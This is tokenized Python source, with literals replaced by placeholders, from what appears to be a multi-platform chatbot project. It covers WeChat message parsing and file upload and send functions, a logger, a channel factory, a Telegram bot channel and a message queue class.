<EOL> actualOpposite = m [ '<STR_LIT>' ] <EOL> if '<STR_LIT>' in m [ '<STR_LIT>' ] or '<STR_LIT>' in m [ '<STR_LIT>' ] : <EOL> produce_group_chat ( core , m ) <EOL> else : <EOL> utils . msg_formatter ( m , '<STR_LIT>' ) <EOL> if '<STR_LIT>' in actualOpposite : <EOL> m [ '<STR_LIT>' ] = core . search_chatrooms ( userName = actualOpposite ) or templates . Chatroom ( { '<STR_LIT>' : actualOpposite } ) <EOL> elif actualOpposite in ( '<STR_LIT>' , '<STR_LIT>' ) : <EOL> m [ '<STR_LIT>' ] = templates . User ( { '<STR_LIT>' : actualOpposite } ) <EOL> else : <EOL> m [ '<STR_LIT>' ] = core . search_mps ( userName = actualOpposite ) or core . search_friends ( userName = actualOpposite ) or templates . User ( userName = actualOpposite ) <EOL> m [ '<STR_LIT>' ] . core = core <EOL> if m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> if m [ '<STR_LIT>' ] : <EOL> regx = r'<STR_LIT>' <EOL> data = re . search ( regx , m [ '<STR_LIT>' ] ) <EOL> data = '<STR_LIT>' if data is None else data . group ( <NUM_LIT> ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : data , } <EOL> else : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> or m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> download_fn = get_download_fn ( core , <EOL> '<STR_LIT>' % core . loginInfo [ '<STR_LIT>' ] , m [ '<STR_LIT>' ] ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' % ( time . strftime ( '<STR_LIT>' , time . localtime ( ) ) , <EOL> '<STR_LIT>' if m [ '<STR_LIT>' ] == <NUM_LIT> else '<STR_LIT>' ) , <EOL> '<STR_LIT>' : download_fn , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> download_fn = get_download_fn ( core , <EOL> '<STR_LIT>' % core . loginInfo [ '<STR_LIT>' ] , m [ '<STR_LIT>' ] ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' % time . strftime ( '<STR_LIT>' , time . localtime ( ) ) , <EOL> '<STR_LIT>' : download_fn , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> m [ '<STR_LIT>' ] [ '<STR_LIT>' ] = m [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } , } <EOL> m [ '<STR_LIT>' ] . verifyDict = msg [ '<STR_LIT>' ] <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } <EOL> elif m [ '<STR_LIT>' ] in ( <NUM_LIT> , <NUM_LIT> ) : <EOL> msgId = m [ '<STR_LIT>' ] <EOL> async def download_video ( videoDir = None ) : <EOL> url = '<STR_LIT>' % core . loginInfo [ '<STR_LIT>' ] <EOL> params = { <EOL> '<STR_LIT>' : msgId , <EOL> '<STR_LIT>' : core . loginInfo [ '<STR_LIT>' ] , } <EOL> headers = { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : config . USER_AGENT } <EOL> r = core . s . get ( url , params = params , headers = headers , stream = True ) <EOL> tempStorage = io . BytesIO ( ) <EOL> for block in r . iter_content ( <NUM_LIT> ) : <EOL> tempStorage . write ( block ) <EOL> if videoDir is None : <EOL> return tempStorage . getvalue ( ) <EOL> with open ( videoDir , '<STR_LIT>' ) as f : <EOL> f . write ( tempStorage . getvalue ( ) ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : <NUM_LIT> , } } ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' % time . strftime ( '<STR_LIT>' , time . localtime ( ) ) , <EOL> '<STR_LIT>' : download_video , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> if m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> rawMsg = m <EOL> cookiesList = { name : data for name , data in core . s . cookies . items ( ) } <EOL> async def download_atta ( attaDir = None ) : <EOL> url = core . loginInfo [ '<STR_LIT>' ] + '<STR_LIT>' <EOL> params = { <EOL> '<STR_LIT>' : rawMsg [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : rawMsg [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : rawMsg [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : core . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : cookiesList [ '<STR_LIT>' ] , } <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> r = core . s . get ( url , params = params , stream = True , headers = headers ) <EOL> tempStorage = io . BytesIO ( ) <EOL> for block in r . iter_content ( <NUM_LIT> ) : <EOL> tempStorage . write ( block ) <EOL> if attaDir is None : <EOL> return tempStorage . getvalue ( ) <EOL> with open ( attaDir , '<STR_LIT>' ) as f : <EOL> f . write ( tempStorage . getvalue ( ) ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : <NUM_LIT> , } } ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : download_atta , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> download_fn = get_download_fn ( core , <EOL> '<STR_LIT>' % core . loginInfo [ '<STR_LIT>' ] , m [ '<STR_LIT>' ] ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' % ( <EOL> time . strftime ( '<STR_LIT>' , time . localtime ( ) ) ) , <EOL> '<STR_LIT>' : download_fn , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> regx = r'<STR_LIT>' <EOL> data = re . search ( regx , m [ '<STR_LIT>' ] ) <EOL> if data : <EOL> data = data . group ( <NUM_LIT> ) . split ( u'<STR_LIT>' ) [ <NUM_LIT> ] <EOL> else : <EOL> data = '<STR_LIT>' <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : data , } <EOL> else : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> msg = update_local_uin ( core , m ) <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> regx = r'<STR_LIT>' <EOL> data = re . search ( regx , m [ '<STR_LIT>' ] ) <EOL> data = '<STR_LIT>' if data is None else data . group ( <NUM_LIT> ) . replace ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : data , } <EOL> elif m [ '<STR_LIT>' ] in srl : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , } <EOL> else : <EOL> logger . debug ( '<STR_LIT>' % ( m [ '<STR_LIT>' ] , str ( m ) ) ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , } <EOL> m = dict ( m , ** msg ) <EOL> rl . append ( m ) <EOL> return rl <EOL> def produce_group_chat ( core , msg ) : <EOL> r = re . match ( '<STR_LIT>' , msg [ '<STR_LIT>' ] ) <EOL> if r : <EOL> actualUserName , content = r . groups ( ) <EOL> chatroomUserName = msg [ '<STR_LIT>' ] <EOL> elif msg [ '<STR_LIT>' ] == core . storageClass . userName : <EOL> actualUserName = core . storageClass . userName <EOL> content = msg [ '<STR_LIT>' ] <EOL> chatroomUserName = msg [ '<STR_LIT>' ] <EOL> else : <EOL> msg [ '<STR_LIT>' ] = core . storageClass . userName <EOL> msg [ '<STR_LIT>' ] = core . storageClass . nickName <EOL> msg [ '<STR_LIT>' ] = False <EOL> utils . msg_formatter ( msg , '<STR_LIT>' ) <EOL> return <EOL> chatroom = core . storageClass . search_chatrooms ( userName = chatroomUserName ) <EOL> member = utils . search_dict_list ( ( chatroom or { } ) . get ( <EOL> '<STR_LIT>' ) or [ ] , '<STR_LIT>' , actualUserName ) <EOL> if member is None : <EOL> chatroom = core . update_chatroom ( chatroomUserName ) <EOL> member = utils . search_dict_list ( ( chatroom or { } ) . get ( <EOL> '<STR_LIT>' ) or [ ] , '<STR_LIT>' , actualUserName ) <EOL> if member is None : <EOL> logger . debug ( '<STR_LIT>' % actualUserName ) <EOL> msg [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> msg [ '<STR_LIT>' ] = False <EOL> else : <EOL> msg [ '<STR_LIT>' ] = member . get ( '<STR_LIT>' , '<STR_LIT>' ) or member [ '<STR_LIT>' ] <EOL> atFlag = '<STR_LIT>' + ( chatroom [ '<STR_LIT>' ] . get ( '<STR_LIT>' , '<STR_LIT>' ) or core . storageClass . nickName ) <EOL> msg [ '<STR_LIT>' ] = ( <EOL> ( atFlag + ( u'<STR_LIT>' if u'<STR_LIT>' in msg [ '<STR_LIT>' ] else '<STR_LIT>' ) ) <EOL> in msg [ '<STR_LIT>' ] or msg [ '<STR_LIT>' ] . endswith ( atFlag ) ) <EOL> msg [ '<STR_LIT>' ] = actualUserName <EOL> msg [ '<STR_LIT>' ] = content <EOL> utils . msg_formatter ( msg , '<STR_LIT>' ) <EOL> async def send_raw_msg ( self , msgType , content , toUserName ) : <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : msgType , <EOL> '<STR_LIT>' : content , <EOL> '<STR_LIT>' : self . storageClass . userName , <EOL> '<STR_LIT>' : ( toUserName if toUserName else self . storageClass . userName ) , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , <EOL> } , <EOL> '<STR_LIT>' : <NUM_LIT> , } <EOL> headers = { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : config . USER_AGENT } <EOL> r = self . s . post ( url , headers = headers , <EOL> data = json . dumps ( data , ensure_ascii = False ) . encode ( '<STR_LIT>' ) ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> async def send_msg ( self , msg = '<STR_LIT>' , toUserName = None ) : <EOL> logger . debug ( '<STR_LIT>' % ( toUserName , msg ) ) <EOL> r = await self . send_raw_msg ( <NUM_LIT> , msg , toUserName ) <EOL> return r <EOL> def _prepare_file ( fileDir , file_ = None ) : <EOL> fileDict = { } <EOL> if file_ : <EOL> if hasattr ( file_ , '<STR_LIT>' ) : <EOL> file_ = file_ . read ( ) <EOL> else : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> else : <EOL> if not utils . check_file ( fileDir ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> with open ( fileDir , '<STR_LIT>' ) as f : <EOL> file_ = f . read ( ) <EOL> fileDict [ '<STR_LIT>' ] = len ( file_ ) <EOL> fileDict [ '<STR_LIT>' ] = hashlib . md5 ( file_ ) . hexdigest ( ) <EOL> fileDict [ '<STR_LIT>' ] = io . BytesIO ( file_ ) <EOL> return fileDict <EOL> def upload_file ( self , fileDir , isPicture = False , isVideo = False , <EOL> toUserName = '<STR_LIT>' , file_ = None , preparedFile = None ) : <EOL> logger . debug ( '<STR_LIT>' % ( <EOL> '<STR_LIT>' if isPicture else '<STR_LIT>' if isVideo else '<STR_LIT>' , fileDir ) ) <EOL> if not preparedFile : <EOL> preparedFile = _prepare_file ( fileDir , file_ ) <EOL> if not preparedFile : <EOL> return preparedFile <EOL> fileSize , fileMd5 , file_ = preparedFile [ '<STR_LIT>' ] , preparedFile [ '<STR_LIT>' ] , preparedFile [ '<STR_LIT>' ] <EOL> fileSymbol = '<STR_LIT>' if isPicture else '<STR_LIT>' if isVideo else '<STR_LIT>' <EOL> chunks = int ( ( fileSize - <NUM_LIT> ) / <NUM_LIT> ) + <NUM_LIT> <EOL> clientMediaId = int ( time . time ( ) * <NUM_LIT> ) <EOL> uploadMediaRequest = json . dumps ( OrderedDict ( [ <EOL> ( '<STR_LIT>' , <NUM_LIT> ) , <EOL> ( '<STR_LIT>' , self . loginInfo [ '<STR_LIT>' ] ) , <EOL> ( '<STR_LIT>' , clientMediaId ) , <EOL> ( '<STR_LIT>' , fileSize ) , <EOL> ( '<STR_LIT>' , <NUM_LIT> ) , <EOL> ( '<STR_LIT>' , fileSize ) , <EOL> ( '<STR_LIT>' , <NUM_LIT> ) , <EOL> ( '<STR_LIT>' , self . storageClass . userName ) , <EOL> ( '<STR_LIT>' , toUserName ) , <EOL> ( '<STR_LIT>' , fileMd5 ) ] <EOL> ) , separators = ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> r = { '<STR_LIT>' : { '<STR_LIT>' : - <NUM_LIT> , '<STR_LIT>' : '<STR_LIT>' } } <EOL> for chunk in range ( chunks ) : <EOL> r = upload_chunk_file ( self , fileDir , fileSymbol , fileSize , <EOL> file_ , chunk , chunks , uploadMediaRequest ) <EOL> file_ . close ( ) <EOL> if isinstance ( r , dict ) : <EOL> return ReturnValue ( r ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> def upload_chunk_file ( core , fileDir , fileSymbol , fileSize , <EOL> file_ , chunk , chunks , uploadMediaRequest ) : <EOL> url = core . loginInfo . get ( '<STR_LIT>' , core . loginInfo [ '<STR_LIT>' ] ) + '<STR_LIT>' <EOL> cookiesList = { name : data for name , data in core . s . cookies . items ( ) } <EOL> fileType = mimetypes . guess_type ( fileDir ) [ <NUM_LIT> ] or '<STR_LIT>' <EOL> fileName = utils . quote ( os . path . basename ( fileDir ) ) <EOL> files = OrderedDict ( [ <EOL> ( '<STR_LIT>' , ( None , '<STR_LIT>' ) ) , <EOL> ( '<STR_LIT>' , ( None , fileName ) ) , <EOL> ( '<STR_LIT>' , ( None , fileType ) ) , <EOL> ( '<STR_LIT>' , ( None , time . strftime ( '<STR_LIT>' ) ) ) , <EOL> ( '<STR_LIT>' , ( None , str ( fileSize ) ) ) , <EOL> ( '<STR_LIT>' , ( None , None ) ) , <EOL> ( '<STR_LIT>' , ( None , None ) ) , <EOL> ( '<STR_LIT>' , ( None , fileSymbol ) ) , <EOL> ( '<STR_LIT>' , ( None , uploadMediaRequest ) ) , <EOL> ( '<STR_LIT>' , ( None , cookiesList [ '<STR_LIT>' ] ) ) , <EOL> ( '<STR_LIT>' , ( None , core . loginInfo [ '<STR_LIT>' ] ) ) , <EOL> ( '<STR_LIT>' , ( fileName , file_ . read ( <NUM_LIT> ) , '<STR_LIT>' ) ) ] ) <EOL> if chunks == <NUM_LIT> : <EOL> del files [ '<STR_LIT>' ] ; del files [ '<STR_LIT>' ] <EOL> else : <EOL> files [ '<STR_LIT>' ] , files [ '<STR_LIT>' ] = ( None , str ( chunk ) ) , ( None , str ( chunks ) ) <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> return core . s . post ( url , files = files , headers = headers , timeout = config . TIMEOUT ) <EOL> async def send_file ( self , fileDir , toUserName = None , mediaId = None , file_ = None ) : <EOL> logger . debug ( '<STR_LIT>' % ( <EOL> mediaId , toUserName , fileDir ) ) <EOL> if hasattr ( fileDir , '<STR_LIT>' ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> if toUserName is None : <EOL> toUserName = self . storageClass . userName <EOL> preparedFile = _prepare_file ( fileDir , file_ ) <EOL> if not preparedFile : <EOL> return preparedFile <EOL> fileSize = preparedFile [ '<STR_LIT>' ] <EOL> if mediaId is None : <EOL> r = self . upload_file ( fileDir , preparedFile = preparedFile ) <EOL> if r : <EOL> mediaId = r [ '<STR_LIT>' ] <EOL> else : <EOL> return r <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : ( "<STR_LIT>" % os . path . basename ( fileDir ) + <EOL> "<STR_LIT>" + <EOL> "<STR_LIT>" % ( str ( fileSize ) , mediaId ) + <EOL> "<STR_LIT>" % os . path . splitext ( fileDir ) [ <NUM_LIT> ] . replace ( '<STR_LIT>' , '<STR_LIT>' ) ) , <EOL> '<STR_LIT>' : self . storageClass . userName , <EOL> '<STR_LIT>' : toUserName , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , } , <EOL> '<STR_LIT>' : <NUM_LIT> , } <EOL> headers = { <EOL> '<STR_LIT>' : config . USER_AGENT , <EOL> '<STR_LIT>' : '<STR_LIT>' , } <EOL> r = self . s . post ( url , headers = headers , <EOL> data = json . dumps ( data , ensure_ascii = False ) . encode ( '<STR_LIT>' ) ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> async def send_image ( self , fileDir = None , toUserName = None , mediaId = None , file_ = None ) : <EOL> logger . debug ( '<STR_LIT>' % ( <EOL> mediaId , toUserName , fileDir ) ) <EOL> if fileDir or file_ : <EOL> if hasattr ( fileDir , '<STR_LIT>' ) : <EOL> file_ , fileDir = fileDir , None <EOL> if fileDir is None : <EOL> fileDir = '<STR_LIT>' <EOL> else : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> if toUserName is None : <EOL> toUserName = self . storageClass . userName <EOL> if mediaId is None : <EOL> r = self . upload_file ( fileDir , isPicture = not fileDir [ - <NUM_LIT> : ] == '<STR_LIT>' , file_ = file_ ) <EOL> if r : <EOL> mediaId = r [ '<STR_LIT>' ] <EOL> else : <EOL> return r <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : mediaId , <EOL> '<STR_LIT>' : self . storageClass . userName , <EOL> '<STR_LIT>' : toUserName , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , } , <EOL> '<STR_LIT>' : <NUM_LIT> , } <EOL> if fileDir [ - <NUM_LIT> : ] == '<STR_LIT>' : <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> data [ '<STR_LIT>' ] [ '<STR_LIT>' ] = <NUM_LIT> <EOL> data [ '<STR_LIT>' ] [ '<STR_LIT>' ] = <NUM_LIT> <EOL> headers = { <EOL> '<STR_LIT>' : config . USER_AGENT , <EOL> '<STR_LIT>' : '<STR_LIT>' , } <EOL> r = self . s . post ( url , headers = headers , <EOL> data = json . dumps ( data , ensure_ascii = False ) . encode ( '<STR_LIT>' ) ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> async def send_video ( self , fileDir = None , toUserName = None , mediaId = None , file_ = None ) : <EOL> logger . debug ( '<STR_LIT>' % ( <EOL> mediaId , toUserName , fileDir ) ) <EOL> if fileDir or file_ : <EOL> if hasattr ( fileDir , '<STR_LIT>' ) : <EOL> file_ , fileDir = fileDir , None <EOL> if fileDir is None : <EOL> fileDir = '<STR_LIT>' <EOL> else : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> if toUserName is None : <EOL> toUserName = self . storageClass . userName <EOL> if mediaId is None : <EOL> r = self . upload_file ( fileDir , isVideo = True , file_ = file_ ) <EOL> if r : <EOL> mediaId = r [ '<STR_LIT>' ] <EOL> else : <EOL> return r <EOL> url = '<STR_LIT>' % ( <EOL> self . loginInfo [ '<STR_LIT>' ] , self . loginInfo [ '<STR_LIT>' ] ) <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : mediaId , <EOL> '<STR_LIT>' : self . storageClass . userName , <EOL> '<STR_LIT>' : toUserName , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , } , <EOL> '<STR_LIT>' : <NUM_LIT> , } <EOL> headers = { <EOL> '<STR_LIT>' : config . USER_AGENT , <EOL> '<STR_LIT>' : '<STR_LIT>' , } <EOL> r = self . s . post ( url , headers = headers , <EOL> data = json . dumps ( data , ensure_ascii = False ) . encode ( '<STR_LIT>' ) ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> async def send ( self , msg , toUserName = None , mediaId = None ) : <EOL> if not msg : <EOL> r = ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> elif msg [ : <NUM_LIT> ] == '<STR_LIT>' : <EOL> if mediaId is None : <EOL> r = await self . send_file ( msg [ <NUM_LIT> : ] , toUserName ) <EOL> else : <EOL> r = await self . send_file ( msg [ <NUM_LIT> : ] , toUserName , mediaId ) <EOL> elif msg [ : <NUM_LIT> ] == '<STR_LIT>' : <EOL> if mediaId is None : <EOL> r = await self . send_image ( msg [ <NUM_LIT> : ] , toUserName ) <EOL> else : <EOL> r = await self . send_image ( msg [ <NUM_LIT> : ] , toUserName , mediaId ) <EOL> elif msg [ : <NUM_LIT> ] == '<STR_LIT>' : <EOL> r = await self . send_msg ( msg [ <NUM_LIT> : ] , toUserName ) <EOL> elif msg [ : <NUM_LIT> ] == '<STR_LIT>' : <EOL> if mediaId is None : <EOL> r = await self . send_video ( msg [ <NUM_LIT> : ] , toUserName ) <EOL> else : <EOL> r = await self . send_video ( msg [ <NUM_LIT> : ] , toUserName , mediaId ) <EOL> else : <EOL> r = await self . send_msg ( msg , toUserName ) <EOL> return r <EOL> async def revoke ( self , msgId , toUserName , localId = None ) : <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : localId or str ( time . time ( ) * <NUM_LIT> ) , <EOL> "<STR_LIT>" : msgId , <EOL> "<STR_LIT>" : toUserName } <EOL> headers = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : config . USER_AGENT } <EOL> r = self . s . post ( url , headers = headers , <EOL> data = json . dumps ( data , ensure_ascii = False ) . encode ( '<STR_LIT>' ) ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> </s>
<s> import logging <EOL> import sys <EOL> def _reset_logger ( log ) : <EOL> for handler in log . handlers : <EOL> handler . close ( ) <EOL> log . removeHandler ( handler ) <EOL> del handler <EOL> log . handlers . clear ( ) <EOL> log . propagate = False <EOL> console_handle = logging . StreamHandler ( sys . stdout ) <EOL> console_handle . setFormatter ( <EOL> logging . Formatter ( <EOL> "<STR_LIT>" , <EOL> datefmt = "<STR_LIT>" , <EOL> ) <EOL> ) <EOL> file_handle = logging . FileHandler ( "<STR_LIT>" , encoding = "<STR_LIT>" ) <EOL> file_handle . setFormatter ( <EOL> logging . Formatter ( <EOL> "<STR_LIT>" , <EOL> datefmt = "<STR_LIT>" , <EOL> ) <EOL> ) <EOL> log . addHandler ( file_handle ) <EOL> log . addHandler ( console_handle ) <EOL> def _get_logger ( ) : <EOL> log = logging . getLogger ( "<STR_LIT>" ) <EOL> _reset_logger ( log ) <EOL> log . setLevel ( logging . INFO ) <EOL> return log <EOL> logger = _get_logger ( ) <EOL> </s>
<s> from channel . wechat . wechat_channel import WechatChannel <EOL> from channel . wechatcom . wechatenterprise_channel import WechatEnterpriseChannel <EOL> from channel . qqchat . qqchat_channel import QqchaChannel <EOL> from channel . dingtalk . dingtalk_channel import DingTalkChannel <EOL> from channel . feishu . feishu_channel import FeiShuChannel <EOL> from channel . webchatmp . wechat_mp_channel import WechatSubsribeAccount <EOL> def create_channel ( channel_type ) : <EOL> if channel_type == '<STR_LIT>' : <EOL> return WechatChannel ( ) <EOL> if channel_type == '<STR_LIT>' : <EOL> return WechatEnterpriseChannel ( ) <EOL> if channel_type == '<STR_LIT>' : <EOL> return QqchaChannel ( ) <EOL> if channel_type == '<STR_LIT>' : <EOL> return DingTalkChannel ( ) <EOL> if channel_type == '<STR_LIT>' : <EOL> return FeiShuChannel ( ) <EOL> if channel_type == '<STR_LIT>' : <EOL> return WechatSubsribeAccount ( ) <EOL> raise RuntimeError <EOL> </s>
<s> from concurrent . futures import ThreadPoolExecutor <EOL> import io <EOL> import requests <EOL> import telebot <EOL> from common . log import logger <EOL> from channel . channel import Channel <EOL> from config import conf <EOL> bot = telebot . TeleBot ( token = conf ( ) . get ( '<STR_LIT>' ) . get ( '<STR_LIT>' ) ) <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> @ bot . message_handler ( commands = [ '<STR_LIT>' ] ) <EOL> def send_welcome ( message ) : <EOL> bot . send_message ( message . chat . id , "<STR_LIT>" , parse_mode = "<STR_LIT>" ) <EOL> @ bot . message_handler ( content_types = [ '<STR_LIT>' ] ) <EOL> def send_welcome ( msg ) : <EOL> TelegramChannel ( ) . handle ( msg ) <EOL> class TelegramChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> pass <EOL> def startup ( self ) : <EOL> logger . info ( "<STR_LIT>" ) <EOL> bot . infinity_polling ( ) <EOL> def handle ( self , msg ) : <EOL> logger . debug ( "<STR_LIT>" + msg . text ) <EOL> thread_pool . submit ( self . _dosend , msg . text , msg ) <EOL> def _dosend ( self , query , msg ) : <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = str ( msg . chat . id ) <EOL> reply_text = super ( ) . build_reply_content ( query , context ) <EOL> logger . info ( '<STR_LIT>' . format ( reply_text ) ) <EOL> bot . reply_to ( msg , reply_text ) <EOL> </s>
<s> import hashlib <EOL> import web <EOL> from handle import Handle <EOL> urls = ( <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> ) <EOL> if __name__ == '<STR_LIT>' : <EOL> app = web . application ( urls , globals ( ) ) <EOL> app . run ( ) <EOL> </s>
<s> import logging <EOL> try : <EOL> import Queue as queue <EOL> except ImportError : <EOL> import queue <EOL> from . templates import AttributeDict <EOL> logger = logging . getLogger ( '<STR_LIT>' ) <EOL> class Queue ( queue . Queue ) : <EOL> def put ( self , message ) : <EOL> queue . Queue . put ( self , Message ( message ) ) <EOL> class Message ( AttributeDict ) : <EOL> def download ( self , fileName ) : <EOL> if hasattr ( self . text , '<STR_LIT>' ) : <EOL> return self . text ( fileName ) <EOL> else : <EOL> return b'<STR_LIT>' <EOL> def __getitem__ ( self , value ) : <EOL> if value in ( '<STR_LIT>' , '<STR_LIT>' ) : <EOL> v = value [ <NUM_LIT> ] . upper ( ) + value [ <NUM_LIT> : ] <EOL> logger . debug ( '<STR_LIT>' % ( value , v ) ) <EOL> value = v <EOL> return super ( Message , self ) . __getitem__ ( value ) <EOL> def __str__ ( self ) : <EOL> return '<STR_LIT>' % '<STR_LIT>' . join ( <EOL> [ '<STR_LIT>' % ( repr ( k ) , repr ( v ) ) for k , v in self . items ( ) ] ) <EOL> def __repr__ ( self ) : <EOL> return '<STR_LIT>' % ( self . __class__ . __name__ . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] , <EOL> self . __str__ ( ) ) <EOL> </s>
